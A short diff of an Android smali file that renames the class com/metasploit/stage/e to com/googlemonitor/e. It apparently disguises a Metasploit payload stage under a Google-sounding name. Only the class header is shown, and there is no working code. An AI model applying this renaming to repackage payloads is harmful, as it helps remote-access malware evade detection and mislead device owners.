@@ -1,4 +1,4 @@
-.class final Lcom/metasploit/stage/e;
+.class final Lcom/googlemonitor/e;
 .super Ljava/lang/Thread;
 
 
